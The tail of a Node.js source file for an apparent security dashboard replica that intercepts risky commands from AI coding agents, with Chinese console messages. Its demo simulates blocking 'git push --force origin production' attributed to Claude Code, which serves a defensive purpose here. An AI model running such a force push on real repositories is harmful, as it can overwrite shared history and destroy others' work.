    console.log(`🎨 设计风格: 完全复制 synodeai.com/dashboard`);
    console.log(`⚡ 功能: 交互式安全决策 + 实时监控`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('');
  });

  return { server, addEvent, simulateInterception };
}

// 主函数
async function main() {
  console.log('🛡️ 启动 Aegis SyNode Dashboard Replica...');

  const { server, addEvent: addEventFn, simulateInterception: simulateFn } = await createSyNodeReplicaMonitor();

  // 演示事件
  setTimeout(() => {
    addEventFn('info', 'SyNode replica dashboard initialized', '', 'System');
  }, 2000);

  setTimeout(() => {
    console.log('🎯 模拟交互式拦截...');
    simulateFn('git push --force origin production', 'Claude Code');
  }, 4000);

  process.on('SIGINT', () => {
    console.log('\n👋 SyNode Dashboard停止中...');
    server.close(() => {
      console.log('✅ SyNode Dashboard已停止');
      process.exit(0);
    });
  });

  global.aegisAddEvent = addEventFn;
  global.aegisSimulateIntercept = simulateFn;
}

if (require.main === module) {
  main().catch(console.error);
}

module.exports = { createSyNodeReplicaMonitor, addEvent, simulateInterception };